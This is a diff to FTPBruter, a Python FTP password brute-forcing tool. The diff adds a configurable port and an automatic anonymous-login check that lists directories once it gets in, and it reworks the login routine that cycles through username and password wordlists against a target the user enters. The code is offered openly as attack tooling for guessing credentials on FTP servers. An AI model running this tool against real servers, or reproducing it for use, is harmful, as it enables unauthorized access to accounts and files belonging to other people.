@@ -2,12 +2,12 @@
 
 # _*_ coding:utf-8 _*_
 
-#to check for anonymous login,provide the username as 'anonymous' or ' '  
-
 import socket
 from os import path, system, name
 from ftplib import FTP
-from  sys import exit,hexversion
+
+#default port for FTP
+PORT = 21
 
 def banner():
     print("""\033[93m ______   _______   _____    ____                   _                 
@@ -19,45 +19,51 @@ def banner():
 \033[1;92m[i]\033[0m\033[37m FTPBruter - A FTP server Brute forcing tool written in Python 3
     Author:\033[1;93m https://GitHackTools.blogspot.com \033[0m""")
 
+
 def clear():
     if name == 'nt':
         system('cls')
     else:
         system('clear')
 
-
-#anonymous login checker
-def anon_ftpbruter(target, username, password):
+def anonymous(target,username,password):
     try:
-        ftp = FTP(target)
-
-        if ftp.login(username,password):
-            print('\033[1;37m[+]\033[37m Anonymous login allowed!\033[0m')
-            ftp.quit()
-
+        ftp = FTP()
+        ftp.connect(target,PORT)
+        ftp.login(username, password)
+        #ftp.quit()
+        print("\033[1;93m[i]\033[37m Anonymous Login Allowed!")
+        ftp.dir() #listing directories
+        ftp.quit()
     except:
-        print('\033[1;91m[+]\033[37m Anonymous login not allowed!\033[0m')
+        print("\033[1;91m[!]\033[37m Anonymous Login Not Allowed!")
+    
 
-    exit(1)
 
-
-#updating
 def main():
+    global PORT
     try:
         print()
         target = str(input('\033[1;96m[-]\033[37m Enter the target address: \033[0m'))
-        
+
+        #port checking required if ftp is not running on default port
+        PORT = input("\033[1;96m[-]\033[37m Enter the Port [Default 21]: \033[0m")
+
+        if PORT == '':
+            PORT = 21
+        else:
+            PORT = int(PORT)
+
         if check_port(target) == True:
+            
+            #anonymous login checking!
+            print('\033[1;96m[+]\033[37m Checking for Anonymous login:')
+            anonymous(target,'anonymous','anonymous')
+
             choice = str(input("\033[1;96m[?]\033[37m Do you want to use username list? [Y/n]: \033[0m"))
             
             if choice[0].upper() == 'N':
                 username = str(input('\033[1;96m[-]\033[37m Enter username: \033[0m'))
-                    
-                #anonymous login
-                if username == 'Anonymous' or username == 'anonymous' or username == '':
-                    #ftpbruter(target,'anonymous','anonymous')
-                    anon_ftpbruter(target,'anonymous','anonymous')
-                    
                 check_wordlist(target, username)
 
             elif choice[0].upper() == 'Y':
@@ -68,16 +74,14 @@ def main():
             main()
 
     except KeyboardInterrupt:
-            print()
-            print("Exiting...")
-            exit()                
-
-
+        print()
+        print("Exiting...")
+        exit()                
 
 def check_port(target):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        port = sock.connect_ex((target,21))
+        port = sock.connect_ex((target,int(PORT)))
 
         if port == 0:
             sock.close
@@ -115,7 +119,7 @@ def check_userlist(target):
     except KeyboardInterrupt:
         print()
         print("Exiting...")
-        exit()  #sys.exit()
+        exit()
 
 def check_wordlist(target, username):
     try:
@@ -172,6 +176,7 @@ def brute_force_list(target, username, wordlist):
 def ftpbruter(target, username, password):
     try:
         ftp = FTP(target)
+        ftp.connect(target,PORT)
         ftp.login(username, password)
         ftp.quit()
         print()
@@ -186,11 +191,6 @@ def ftpbruter(target, username, password):
     except:
         pass
 
-#main
-if __name__ == '__main__':
-    if hexversion >= 0x03000000:
-        clear()
-        banner()
-        main()
-    else:
-        exit('\033[1;91m[+]\033[37m Required Python Version > 3.0!\033[0m')
+clear()
+banner()
+main()
